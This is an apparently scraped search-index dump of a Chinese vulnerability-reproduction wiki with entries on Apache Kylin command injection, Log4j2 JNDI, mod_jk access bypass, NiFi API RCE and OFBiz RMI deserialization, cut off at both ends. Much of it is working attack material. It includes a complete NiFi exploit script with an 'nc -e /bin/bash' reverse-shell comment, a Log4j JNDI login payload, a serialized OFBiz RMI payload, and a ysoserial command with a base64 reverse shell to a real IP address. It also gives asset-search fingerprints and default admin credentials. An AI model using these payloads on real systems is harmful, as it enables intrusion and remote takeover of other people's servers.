","date":"0001-01-01","objectID":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/:2:0","tags":null,"title":"","uri":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/"},{"categories":null,"content":"环境搭建 docker pull apachekylin/apache-kylin-standalone:3.0.1 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 ","date":"0001-01-01","objectID":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/:3:0","tags":null,"title":"","uri":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/"},{"categories":null,"content":"漏洞复现 查看这个漏洞修复的补丁 这里可以看到此漏洞有关的参数有三个，分别是 srcCfgUri、dstCfgUri、projectName, 相关的函数为 migrateCube 官方文档中对 migrateCube 的描述 POST /kylin/api/cubes/{cube}/{project}/migrate 下载 Apache Kylin 3.0.1 的源代码进行代码审计,出现漏洞函数的文件为以下路径 apache-kylin-3.0.1\\server-base\\src\\main\\java\\org\\apache\\kylin\\rest\\service\\CubeService.java 找到migrateCube函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") public void migrateCube(CubeInstance cube, String projectName) { KylinConfig config = cube.getConfig(); if (!config.isAllowAutoMigrateCube()) { throw new InternalErrorException(\"One click migration is disabled, please contact your ADMIN\"); } for (CubeSegment segment : cube.getSegments()) { if (segment.getStatus() != SegmentStatusEnum.READY) { throw new InternalErrorException( \"At least one segment is not in READY state. Please check whether there are Running or Error jobs.\"); } } String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); String stringBuilderstringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform one-click migrating\", e); } } PreAuthorize里面定义了路由权限，ADMIN权限、ADMINISTRATION权限和MANAGEMENT权限可以访问该service。 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#cube, 'ADMINISTRATION') or hasPermission(#cube, 'MANAGEMENT')\") 在1087行判断是否开启了MigrateCube设置，如果没有开启则会报错 跟进 isAllowAutoMigrateCube() 这个函数 可以看到这里默认的配置kylin.tool.auto-migrate-cube.enabled就是Flase public boolean isAllowAutoMigrateCube() { return Boolean.parseBoolean(getOptional(\"kylin.tool.auto-migrate-cube.enabled\", FALSE)); } 在没有开启配置kylin.tool.auto-migrate-cube.enabled为true的情况下，调用MigrateCube则会出现报错 通过Apache Kylin的SYSTEM模块开启kylin.tool.auto-migrate-cube.enabled为True 设置后再去请求则不会出现刚刚的报错，而是出现Source configuration should not be empty 跟进出现报错的代码块 String srcCfgUri = config.getAutoMigrateCubeSrcConfig(); String dstCfgUri = config.getAutoMigrateCubeDestConfig(); Preconditions.checkArgument(StringUtils.isNotEmpty(srcCfgUri), \"Source configuration should not be empty.\"); Preconditions.checkArgument(StringUtils.isNotEmpty(dstCfgUri), \"Destination configuration should not be empty.\"); 这里进行了对kylin.tool.auto-migrate-cube.src-config和kylin.tool.auto-migrate-cube.dest-config的配置进行了检测,如果为空则会出现刚刚的报错 跟进 getAutoMigrateCubeSrcConfig()和getAutoMigrateCubeDestConfig()函数 public String getAutoMigrateCubeSrcConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.src-config\", \"\"); } public String getAutoMigrateCubeDestConfig() { return getOptional(\"kylin.tool.auto-migrate-cube.dest-config\", \"\"); } 发现这两个配置默认为空，因为配置允许自定义，所以srcCfgUri和dstCfgUri两个变量均是可控的, 继续向下走，发现一处命令拼接 String stringBuilder = (\"%s/bin/kylin.sh org.apache.kylin.tool.CubeMigrationCLI %s %s %s %s %s %s true true\"); String cmd = String.format(Locale.ROOT, stringBuilder, KylinConfig.getKylinHome(), srcCfgUri, dstCfgUri, cube.getName(), projectName, config.isAutoMigrateCubeCopyAcl(), config.isAutoMigrateCubePurge()); logger.info(\"One click migration cmd: \" + cmd); CliCommandExecutor exec = new CliCommandExecutor(); PatternedLogger patternedLogger = new PatternedLogger(logger); try { exec.execute(cmd, patternedLogger); } catch (IOException e) { throw new InternalErrorException(\"Failed to perform o","date":"0001-01-01","objectID":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/:4:0","tags":null,"title":"","uri":"/apache-kylin-cubeservice.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-1956/"},{"categories":null,"content":"Apache Kylin DiagnosisController.java 命令注入漏洞 CVE-2020-13925 ","date":"0001-01-01","objectID":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/:0:0","tags":null,"title":"","uri":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/"},{"categories":null,"content":"漏洞描述 6月，京东安全的蓝军团队发现了一个 apache kylin 远程命令执行严重漏洞（ CVE-2020-13925）。黑客可以利用这个漏洞，登录任何管理员账号和密码默认未修改的账号，获得管理员权限。由于Apache Kylin被广泛应用于企业的大数据分析平台，因此该漏洞将对企业核心数据具有较大的危害，存在数据泄露风险，建议用户尽快升级软件至安全版本。 ","date":"0001-01-01","objectID":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/:1:0","tags":null,"title":"","uri":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/"},{"categories":null,"content":"漏洞影响 Apache Kylin 2.3.0 ~ 2.3.2 Apache Kylin 2.4.0 ~ 2.4.1 Apache Kylin 2.5.0 ~ 2.5.2 Apache Kylin 2.6.0 ~ 2.6.5 Apache Kylin 3.0.0-alpha ","date":"0001-01-01","objectID":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/:2:0","tags":null,"title":"","uri":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/"},{"categories":null,"content":"环境搭建 docker pull apachekylin/apache-kylin-standalone:3.0.1 docker run -d \\ -m 8G \\ -p 7070:7070 \\ -p 8088:8088 \\ -p 50070:50070 \\ -p 8032:8032 \\ -p 8042:8042 \\ -p 16010:16010 \\ apachekylin/apache-kylin-standalone:3.0.1 打开后使用默认账号密码admin/KYLIN登录，出现初始界面即为成功 ","date":"0001-01-01","objectID":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/:3:0","tags":null,"title":"","uri":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/"},{"categories":null,"content":"漏洞复现 出现漏洞的代码文件在server-base/src/main/java/org/apache/kylin/rest/controller/DiagnosisController.java /** * Get diagnosis information for project */ @RequestMapping(value = \"/project/{project}/download\", method = { RequestMethod.GET }, produces = { \"application/json\" }) @ResponseBody public void dumpProjectDiagnosisInfo(@PathVariable String project, final HttpServletRequest request, final HttpServletResponse response) { try (AutoDeleteDirectory diagDir = new AutoDeleteDirectory(\"diag_project\", \"\")) { String filePath = dgService.dumpProjectDiagnosisInfo(project, diagDir.getFile()); setDownloadResponse(filePath, response); } catch (IOException e) { throw new InternalErrorException(\"Failed to dump project diagnosis info. \" + e.getMessage(), e); } } 这里可以看到 {project}参数是用户可控的变量，向下跟进dumpProjectDiagnosisInfo函数 public String dumpProjectDiagnosisInfo(String project, File exportPath) throws IOException { aclEvaluate.checkProjectOperationPermission(project); String[] args = { project, exportPath.getAbsolutePath() }; runDiagnosisCLI(args); return getDiagnosisPackageName(exportPath); } 首先通过checkProjectOperationPermission函数来检查该project是否许可，然后构建一个args的字符串数组，看一下checkProjectOperationPermission函数 public void checkProjectOperationPermission(String projectName) { ProjectInstance projectInstance = getProjectInstance(projectName); aclUtil.hasProjectOperationPermission(projectInstance); } 这里传入projectName，然后通过getProjectInstance来获取项目实例,跟进getProjectInstance private ProjectInstance getProjectInstance(String projectName) { return ProjectManager.getInstance(KylinConfig.getInstanceFromEnv()).getProject(projectName); } 因为 projectName 会被我们替换掉，所以不会获得一个正确的projectName,则会返回一个Null，查看下hasProjectOperationPermission函数 @PreAuthorize(Constant.ACCESS_HAS_ROLE_ADMIN + \" or hasPermission(#project, 'ADMINISTRATION')\" + \" or hasPermission(#project, 'MANAGEMENT')\" + \" or hasPermission(#project, 'OPERATION')\") public boolean hasProjectOperationPermission(ProjectInstance project) { return true; } 这里并没有对projectName进行检验，只对用户身份进行了检验，当为ADMIN、ADMINISTRATION、MANAGEMENT、OPERATION等权限，该值默认返回为true，回到 dumpProjectDiagnosisInfo函数，向下继续跟进runDiagnosisCLI函数 private void runDiagnosisCLI(String[] args) throws IOException { Message msg = MsgPicker.getMsg(); File cwd = new File(\"\"); logger.debug(\"Current path: \" + cwd.getAbsolutePath()); logger.debug(\"DiagnosisInfoCLI args: \" + Arrays.toString(args)); File script = new File(KylinConfig.getKylinHome() + File.separator + \"bin\", \"diag.sh\"); if (!script.exists()) { throw new BadRequestException( String.format(Locale.ROOT, msg.getDIAG_NOT_FOUND(), script.getAbsolutePath())); } String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair\u003cInteger, String\u003e cmdOutput = executor.execute(diagCmd); if (cmdOutput.getFirst() != 0) { throw new BadRequestException(msg.getGENERATE_DIAG_PACKAGE_FAIL()); } } 注意看这几行代码 String diagCmd = script.getAbsolutePath() + \" \" + StringUtils.join(args, \" \"); CliCommandExecutor executor = KylinConfig.getInstanceFromEnv().getCliCommandExecutor(); Pair\u003cInteger, String\u003e cmdOutput = executor.execute(diagCmd); 与 Apache Kylin 命令注入漏洞CVE-2020-1956类似，同样也是经过execute函数，而digCmd同样也是经过了命令拼接 private Pair\u003cInteger, String\u003e runRemoteCommand(String command, Logger logAppender) throws IOException { SSHClient ssh = new SSHClient(remoteHost, port, remoteUser, remotePwd); SSHClientOutput sshOutput; try { sshOutput = ssh.execCommand(command, remoteTimeoutSeconds, logAppender); int exitCode = sshOutput.getExitCode(); String output = sshOutput.getText(); return Pair.newPair(exitCode, output); } catch (IOException e) { throw e; } catch (Exception e) { throw new IOException(e.getMessage(), e); } } private Pair\u003cInteger, String\u003e runNativeCommand(String command, Logger logAppender) throws IOException { String[] cmd = new String[3]; String osName = System.getProperty(\"os.name\"); if (osName.startsWith(\"Windows\")) { cmd[0] = \"cmd.exe\"; cmd[1] = \"/C\"; } else { ","date":"0001-01-01","objectID":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/:4:0","tags":null,"title":"","uri":"/apache-kylin-diagnosiscontroller.java-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2020-13925/"},{"categories":null,"content":"Apache Log4j2 JNDI 远程命令执行漏洞 CVE-2021-44228 ","date":"0001-01-01","objectID":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/:0:0","tags":null,"title":"","uri":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/"},{"categories":null,"content":"漏洞描述 Apache Log4j2是一款使用非常广泛的Java日志框架。2021年12月9日，Apache Log4j2爆出存在远程代码执行漏洞，由于Apache Log4j2广泛地应用在各种Web程序中，该漏洞涉及用户量较大，危害性非常之高，漏洞影响版本为2.0~2.14.1。 ","date":"0001-01-01","objectID":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/:1:0","tags":null,"title":"","uri":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/"},{"categories":null,"content":"漏洞影响 2.0~2.14.1 使用此依赖的JAVA应用 ","date":"0001-01-01","objectID":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/:2:0","tags":null,"title":"","uri":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/"},{"categories":null,"content":"网络测绘 app=\"Log4j2\" ","date":"0001-01-01","objectID":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/:3:0","tags":null,"title":"","uri":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/"},{"categories":null,"content":"漏洞复现 参数点发送请求 POST /api/2.0/login HTTP/1.1 Host: Cookie: JSESSIONID_AV=567CEDA964EE4D5DA8B7FC8C90912B01 Content-Length: 86 Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\" Accept: application/json, text/javascript, */*; q=0.01 Content-Type: application/json X-Requested-With: XMLHttpRequest Sec-Ch-Ua-Mobile: ?0 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Sec-Ch-Ua-Platform: \"macOS\" Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty cmd: whoami Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Connection: close {\"username\":\"${jndi:ldap://xxx.xxx.xxx.xxx:1389/Basic/TomcatEcho}\",\"password\":\"admin\"} ","date":"0001-01-01","objectID":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/:4:0","tags":null,"title":"","uri":"/apache-log4j2-jndi-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-44228/"},{"categories":null,"content":"Apache Mod_jk 访问控制权限绕过 CVE-2018-11759 ","date":"0001-01-01","objectID":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/:0:0","tags":null,"title":"","uri":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/"},{"categories":null,"content":"漏洞描述 Apache Tomcat JK（mod_jk）Connector是美国阿帕奇（Apache）软件基金会的一款为Apache或IIS提供连接后台Tomcat的模块，用以为Apache或IIS服务器提供处理JSP/Servlet的能力。 由于httpd和Tomcat在路径处理规范上存在差异，因此可以绕过Apache mod_jk Connector 1.2.0版本到1.2.44版本上由JkMount httpd指令所定义端点的访问控制限制。 如果一个只有只读权限的jkstatus的接口可以访问的话，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 如果一个具有读写权限的jkstatus接口可供访问，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，又或者进行内部的端口扫描。 ","date":"0001-01-01","objectID":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/:1:0","tags":null,"title":"","uri":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/"},{"categories":null,"content":"漏洞影响 Apache Mod_jk Connector 1.2.0 ~ 1.2.44 ","date":"0001-01-01","objectID":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/:2:0","tags":null,"title":"","uri":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/"},{"categories":null,"content":"环境搭建 git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d 访问 http://xxx.xxx.xxx.xxx:80 成功即可 ","date":"0001-01-01","objectID":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/:3:0","tags":null,"title":"","uri":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/"},{"categories":null,"content":"漏洞复现 访问 http://xxx.xxx.xxx.xxx/jkstatus 显示无权限访问 Forbidden You don't have permission to access /jkstatus on this server. 访问 http://xxx.xxx.xxx.xxx/jkstatus; 即可绕过 注意是在url后面加上了一个; ","date":"0001-01-01","objectID":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/:4:0","tags":null,"title":"","uri":"/apache-mod_jk-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-cve-2018-11759/"},{"categories":null,"content":"Apache NiFi Api 远程代码执行 RCE ","date":"0001-01-01","objectID":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:0:0","tags":null,"title":"","uri":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"漏洞描述 Apache NiFi是Apache Software Foundation的一个软件项目，旨在使软件系统之间的数据流自动化。 参考链接： https://twitter.com/chybeta/status/1333341820596568065 https://github.com/imjdl/Apache-NiFi-Api-RCE https://forum.ywhack.com/thread-114763-1-3.html ","date":"0001-01-01","objectID":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:1:0","tags":null,"title":"","uri":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"网络测绘 \"nifi\" \u0026\u0026 title==\"NiFi\" ","date":"0001-01-01","objectID":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:2:0","tags":null,"title":"","uri":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"漏洞复现 exp： import sys import json import requests as req class Exp: def __init__(self, url): self.url = url def check_is_vul(self): url = self.url + \"/nifi-api/access/config\" try: res = req.get(url=url, verify=False) data = res.json() return not data[\"config\"][\"supportsLogin\"] except Exception as e: pass return False def clean_up(self, p_id): url = self.url + \"/nifi-api/processors/\" + p_id + \"/run-status\" data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'} req.put(url=url, data=json.dumps(data), verify=False) req.delete(url + \"/threads\", verify=False) def exploit(self, cmd): g_id = self.fetch_process_group() if g_id: p_id = self.create_process(g_id) if p_id: self.run_cmd(p_id=p_id, cmd=cmd) self.clean_up(p_id=p_id) def run_cmd(self, p_id, cmd): url = self.url + \"/nifi-api/processors/\" + p_id cmd = cmd.split(\" \") data = { 'component': { 'config': { 'autoTerminatedRelationships': ['success'], 'properties': { 'Command': cmd[0], 'Command Arguments': \" \".join(cmd[1:]), }, 'schedulingPeriod': '3600 sec' }, 'id': p_id, 'state': 'RUNNING' }, 'revision': {'clientId': 'x', 'version': 1} } print(data) headers = { \"Content-Type\": \"application/json\", } res = req.put(url=url, data=json.dumps(data), headers=headers, verify=False) return res.json() def fetch_process_group(self): url = self.url + \"/nifi-api/process-groups/root\" try: res = req.get(url=url, verify=False) data = res.json()[\"id\"] return data except Exception as e: pass return 0 def create_process(self, process_group_id): url = self.url + \"/nifi-api/process-groups/\" + process_group_id + \"/processors\" data = { 'component': { 'type': 'org.apache.nifi.processors.standard.ExecuteProcess' }, 'revision': { 'version': 0 } } headers = { \"Content-Type\": \"application/json\", } try: res = req.post(url=url, data=json.dumps(data), headers=headers, verify=False) return res.json()[\"id\"] except Exception as e: pass return 0 if __name__ == '__main__': if len(sys.argv) != 3: print(\"rce.py url cmd\") else: url = sys.argv[1] # http://192.168.1.1:8080 cmd = sys.argv[2] # nc -e /bin/bash 192.168.1.129 1234 e = Exp(url) e.exploit(cmd) msf模块： https://packetstormsecurity.com/files/160260/apache_nifi_processor_rce.rb.txt ","date":"0001-01-01","objectID":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/:3:0","tags":null,"title":"","uri":"/apache-nifi-api-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-rce/"},{"categories":null,"content":"Apache OFBiz RMI Bypass RCE CVE-2021-29200 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/:0:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/"},{"categories":null,"content":"漏洞描述 由于Apache OFBiz存在Java RMI反序列化漏洞，未经身份验证的用户可以执行RCE攻击，导致服务器被接管。 参考链接： https://mp.weixin.qq.com/s/vM0pXZ5mhusFBsj1xD-2zw https://xz.aliyun.com/t/9556 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/:1:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/"},{"categories":null,"content":"漏洞影响 Apache OFBiz \u003c 17.12.07 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/:2:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/"},{"categories":null,"content":"漏洞复现 poc： POST /webtools/control/SOAPService HTTP/1.1 Host: xxx User-Agent: python-requests/2.24.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Content-Type: text/xml Content-Length: 877 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ser=\"http://ofbiz.apache.org/service/\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cser\u003e \u003cmap-Map\u003e \u003cmap-Entry\u003e \u003cmap-Key\u003e \u003ccus-obj\u003eACED0005737200326A617661782E6D616E6167656D656E742E72656D6F74652E726D692E524D49436F6E6E656374696F6E496D706C5F5374756200000000000000020200007872001A6A6176612E726D692E7365727665722E52656D6F746553747562ECC98BE1651A0200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707738000A556E6963617374526566000F3130342E3135362E3233312E3135300000270FFFFFFFFFEF34D1DB00000000000000000000000000000078\u003c/cus-obj\u003e \u003c/map-Key\u003e \u003cmap-Value\u003e \u003cstd-String/\u003e \u003c/map-Value\u003e \u003c/map-Entry\u003e \u003c/map-Map\u003e \u003c/ser\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/:3:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi-bypass-rce-cve-2021-29200/"},{"categories":null,"content":"Apache OFBiz RMI反序列化漏洞 CVE-2021-26295 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:0:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"漏洞描述 OFBiz是基于Java的Web框架，包括实体引擎，服务引擎和基于小部件的UI。 近日，Apache OFBiz官方发布安全更新。Apache OFBiz 存在RMI反序列化前台命令执行，未经身份验证的攻击者可以使用此漏洞来成功接管Apache OFBiz，建议相关用户尽快测试漏洞修复的版本并及时升级。 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:1:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"漏洞影响 Apache OFBiz \u003c 17.12.06 ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:2:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"网络测绘 app=\"Apache_OFBiz\" ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:3:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"环境搭建 docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:4:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"漏洞复现 使用文章目录中的POC脚本 验证 Dnslog 反弹shell使用 ROME反序列化链就行了 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i \u0026\u003e/dev/tcp/81.68.139.186/9999 \u003c\u00261' base64加密写入然后执行命令 然后把数据填入下面的 反弹shell脚本中的Hex_data参数中运行脚本即可反弹shell ","date":"0001-01-01","objectID":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/:5:0","tags":null,"title":"","uri":"/apache-ofbiz-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2021-26295/"},{"categories":null,"content":"漏洞POC 需要将POC放在与 ysoserial.jar 同一目录 一个为 dnslog检测，另一个为反弹shell import requests import 